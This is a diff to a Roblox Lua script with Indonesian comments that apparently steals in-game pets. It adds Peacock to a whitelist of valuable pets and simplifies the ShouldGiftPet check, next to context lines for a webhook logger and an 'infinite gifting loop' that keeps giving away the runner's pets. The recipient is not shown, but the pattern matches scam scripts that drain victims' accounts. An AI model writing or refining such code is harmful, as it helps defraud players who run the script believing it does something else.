@@ -700,25 +700,14 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
 local PetWhitelist = {
     ["Brontosaurus"] = true,
     ["Mimic Octopus"] = true,
-    ["Bald Eagle"] = true,
+["Peacock"] = true,
+["Bald Eagle"] = true,
+   
 }
 
--- Cek apakah petName diakhiri dengan base pet name (tanpa mutasi)
-local function IsWhitelistedMutatedPet(petName)
-    for baseName, _ in pairs(PetWhitelist) do
-        -- Cocokkan suffix
-        if petName:sub(-#baseName) == baseName then
-            return true
-        end
-    end
-    return false
-end
-
 local function ShouldGiftPet(pet)
-    -- Gunakan PetName karena itu yang punya mutation prefix
-    local name = pet.PetName or pet.Name or ""
-
-    if IsWhitelistedMutatedPet(name) then
+    -- Pet.Type sudah versi tanpa mutation prefix
+    if PetWhitelist[pet.Type] then
         return true
     end
 
@@ -726,8 +715,8 @@ local function ShouldGiftPet(pet)
 end
 
 
--- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
-task.spawn(function()
+        -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
+        task.spawn(function()
     while true do
         task.wait(2)
         local currentPets = GetPlayerPets()
